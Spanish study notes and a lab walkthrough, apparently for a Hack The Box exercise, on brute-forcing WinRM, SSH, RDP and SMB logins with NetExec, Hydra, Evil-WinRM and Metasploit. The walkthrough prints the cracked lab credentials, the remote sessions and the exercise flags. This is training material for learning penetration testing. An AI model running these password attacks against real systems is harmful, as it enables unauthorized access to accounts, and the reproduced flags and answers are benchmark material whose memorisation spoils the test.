- En todas las redes que auditamos hay servicios para gestionar, editar o crear contenido (FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP, LDAP, etc.).
- Esos servicios se ejecutan con permisos específicos y cuentas de usuario asignadas.
- Para administrar un servidor Windows por red lo más habituales son RDP y WinRM (SSH es menos común en Windows; sí es el estándar en Linux).
- Todos requieren autenticación (usuario + contraseña), aunque a veces se configuran para usar claves o métodos más restrictivos; muchas instalaciones mantienen configuraciones por defecto.
---

## WinRM (Windows Remote Manager)

Administración Remota de Windows (WinRM) es la implementación de Microsoft del Protocolo de Administración de Servicios Web (WS-Management). 
Se trata de un protocolo de red basado en servicios web XML que utiliza el Protocolo Simple de Acceso a Objetos (SOAP) para la administración remota de sistemas Windows. Se encarga de la comunicación entre la Administración Empresarial Basada en Web (WBEM) y el Instrumental de Administración de Windows (WMI), que puede llamar al Modelo de Objetos de Componentes Distribuidos (DCOM).

Por razones de seguridad, WinRM debe activarse y configurarse manualmente en Windows 10/11. Por lo tanto, depende en gran medida de la seguridad del entorno del dominio o red local donde se utilice. En la mayoría de los casos, se utilizan certificados o mecanismos de autenticación específicos para aumentar la seguridad. Por defecto, WinRM utiliza los puertos TCP 5985 (HTTP) y 5986 (HTTPS).

---
## NetExec

Una herramienta útil para ataques de contraseñas es NetExec, que también se puede usar para otros protocolos como SMB, LDAP, MSSQL, etc:

**Netexec** se refiere a una utilidad que permite **ejecutar comandos en otra máquina a través de la red**. Es decir, su propósito es lanzar procesos remotamente o abrir shells remotos para administración, despliegues, pruebas o debugging.Recomendamos leer la documentación oficial de esta herramienta para familiarizarse con ella.

Con el siguiente comando podemos ver un menú de ayuda general:
```shell-session
netexec -h
```

Podemos seleccionar un protocolo (por ejemplo, smb) y ver que opciones podemos aplicar sobre este mediante el comando:
```
netexec smb -h
```

El **formato principal*** para peticiones netexec es el siguiente:
```
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

Por ejemplo, para atacar a un servicio winrm, podemos utilizar el comando:
```
netexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

El concepto "Pwn3d1" indica que si nos logeamos con el usuario y contraseña dados podemos ejecutar comandos de "system".

---

## WinRM

Otra herramienta util para comunicarnos con WinRM es "Evil-WinRM".
La estructura es la misma que con `netexec:`
```
evil-winrm -i <target-IP> -u <username> -p <password>
```

Por ejemplo:
```
Polika4RM@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```

Si el Login es successful, una consola de sesión se iniciará usando Power Shell Remoting Protocol.

---

### SSH
SSH (Secure Shell) es un protocolo seguro que permite conectarse a un host remoto para ejecutar comandos o transferir archivos. Funciona por defecto en el puerto TCP 22 y utiliza tres métodos criptográficos principales: cifrado simétrico, cifrado asimétrico y hashing.

### Encriptación simétrica
El cifrado simétrico emplea una misma clave tanto para cifrar como para descifrar los datos. Esto significa que cualquier persona que posea la clave puede acceder a la información transmitida. Para intercambiar esta clave de manera segura, SSH utiliza el método de intercambio de claves Diffie-Hellman, que permite que el cliente y el servidor generen una clave compartida sin que un tercero pueda descubrirla. Entre los algoritmos más comunes de cifrado simétrico se encuentran AES, Blowfish y 3DES.

### Encriptación asimétrica
Por otro lado, el cifrado asimétrico utiliza un par de claves diferentes: una clave pública y una clave privada. La clave pública se puede compartir libremente, mientras que la privada debe mantenerse en secreto. Durante la conexión, el servidor utiliza la clave pública para autenticar al cliente. Si este puede descifrar un mensaje con su clave privada, se confirma su identidad y se establece la sesión SSH. Sin embargo, si un atacante obtiene la clave privada, podría acceder al sistema sin necesidad de credenciales.

### Hashing
Finalmente, el hashing se usa para garantizar la integridad y autenticidad de los mensajes. Este proceso convierte los datos en un valor único e irreversible mediante un algoritmo matemático. De esta forma, SSH puede comprobar que la información no ha sido alterada durante la transmisión. A diferencia del cifrado, el hashing no puede revertirse para recuperar los datos originales.

---

# HYDRA

### HYDRA & SSH
Podemos utilizar Hydra para hacer fuerza bruta contra el protocolo SSH:
```shell-session
Polika4RM@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

Una vez tengamos las credenciales, podremos loggearnos con:
```shell-session
ssh <nombre_usuario@<ip_servidor_ssh>
```

### HYDRA & RDP
Podemos realizar fuerza bruta contra un servidor RDP con HYDRA con el comando.
```
Polika4RM@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
```

Con este comando podemos conseguir un usuario y contraseña, credenciales las cuales podemos utilizar mediante xfreerdp o Remmina (de cara a conectarnos al escritorio remoto):
```
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

### HYDRA & SMB
Podemos hacer fuerza bruta contra un servidor SMB con el comando:
```
hydra -L user.list -P password.list smb://10.129.42.197
```

En caso de recibir un "invalid reply", podemos utilizar el framework de Metasploit para dicha función; pues, utilizaremos:
```
msfconsole
use /auxiliary/scanner/smb/smb_login
set user_file user.list
set pass_file password.list
set rhosts 1.2.3.4
run
```

Ahora, una vez que tenemos credenciales, podemos ejecutar NetExec para ver los shares disponibles:
```
netexec smb 1.2.3.4 -u "user" -p "password" --shares
```

Para comunicarnos con el servidor y explorar un SHARE concreto (ver comando anterior), podemos utilizar la herramienta smbclient:
```
smbclient -U user \\\\10.129.42.197\\SHARENAME
```


----
**TARGET: 10.129.202.136**
**1. Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.**

Me descargo el archivo .zip que aporta el ejercicio, donde se especifica una user.list y password.list para realizar dicho ataque.

Contra WinRM, para hacer fuerza bruta, ejecuto:
```
netexec winrm 10.129.202.136 -u username.list -p password.list
```

Después de esperar 3-4 minutos, encuentro la siguiente credencias:
```
WINRM       10.129.202.136  5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)
```

Con estas credenciales, podemos pasar a ejecutar EVIL-WinRM para entrar con una consola interactiva:
```
evil-winrm -i 10.129.202.136 -u john -p november
```

Finalmente, en la siguiente ruta encontraremos la "flag.txt":
```
*Evil-WinRM* PS C:\Users\john\Desktop> type flag.txt
HTB{That5Novemb3r}
```


**2. Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.**
Realizo fuerza bruta contra el servidor SSH y me encuentro las siguientes credenciales: 
```
hydra -L username.list -P password.list ssh://10.129.202.136

[22][ssh] host: 10.129.202.136   login: dennis   password: rockstar

```

Con estas credenciales, ingreso al servicio *ssh* con:
```
ssh dennis@10.129.202.136
```

Y ubico la flag en:
```
dennis@WINSRV C:\Users\dennis\Desktop>type flag.txt
HTB{Let5R0ck1t}   
```

**3. Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.**

Ejecutando un: 
```
hydra -L username.list -P password.list rdp://10.129.202.136 -t 4
```
No di nunca con la respuesta.... Salía la respuesta correcta pero la marcaba como "probablemente no activa":
```
[3389][rdp] account on 10.129.202.136 might be valid but account not active for remote desktop: login: chris password: 789456123, continuing attacking the account.

```

Probé de hacerlo por SMB:
Ejecuto el comando:
```
hydra -L username.list -P password.list smb://10.129.202.136
```

Pero me encuentro un mensaje de "invalid reply from target". En este caso, tenemos que utilizar el servicio de msf_console:
```
msf auxiliary(scanner/smb/smb_login) > set user_file /home/polika4r/Descargas/contraseñas/username.list
user_file => /home/polika4r/Descargas/contraseñas/username.list
msf auxiliary(scanner/smb/smb_login) > set pass_file /home/polika4r/Descargas/contraseñas/password.list
pass_file => /home/polika4r/Descargas/contraseñas/password.list
msf auxiliary(scanner/smb/smb_login) > set rhosts 10.129.202.136
run
```

Encuentro las siguientes contraseñas: 
```
[+] 10.129.202.136:445    - 10.129.202.136:445 - Success: '.\john:november'
[+] 10.129.202.136:445    - 10.129.202.136:445 - Success: '.\dennis:rockstar'
[+] 10.129.202.136:445    - 10.129.202.136:445 - Success: '.\chris:789456123'
[+] 10.129.202.136:445    - 10.129.202.136:445 - Success: '.\cassie:12345678910'
```

Me conecto por freerdp3 (o por Remmina podría también), con el comando:
```
xfreerdp3 /v:10.129.202.136 /u:chris /p:789456123
```

Y se abre una interfaz visual de la máquina windows víctima. 
En el propio escritorio, encuentro la flag.txt: HTB{R3m0t3DeskIsw4yT00easy}.

**4. Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.**

Partiendo del escaneo SMB que ya realicé en el ejercicio anterior, ejecuto:
```
netexec smb 10.129.202.136 -u "cassie" -p "12345678910" --shares
SMB         10.129.202.136  445    WINSRV           [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.202.136  445    WINSRV           [+] WINSRV\cassie:12345678910 
SMB         10.129.202.136  445    WINSRV           [*] Enumerated shares
SMB         10.129.202.136  445    WINSRV           Share           Permissions     Remark
SMB         10.129.202.136  445    WINSRV           -----           -----------     ------
SMB         10.129.202.136  445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.202.136  445    WINSRV           C$                              Default share
SMB         10.129.202.136  445    WINSRV           CASSIE          READ,WRITE      
SMB         10.129.202.136  445    WINSRV           IPC$            READ            Remote IPC

```

Observo que hay un recurso compartido llamado "CASSIE" sobre el cual se posee permisos de escritura y lectura. 

Ejecuto el siguiente comando (me ha fallado en varias ocasiones, tuve que insistir bastante porque estaba desde una VPN. Mejor probarlo desde la máquina que HTB ofrece como atacante):
```
smbclient -U cassie \\\\10.129.202.136\\CASSIE
```
Introducimos la contraseña "*12345678910"*  (ha fallado muchas veces...).

Entramos, y conforme se desplega la terminal vemos la flag.txt.
Realizamos un:
```
mb: \> get flag.txt
getting file \flag.txt of size 16 as flag.txt (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)

```

Y nos descarga la flag.txt con contenido:
```
HTB{S4ndM4ndB33}
```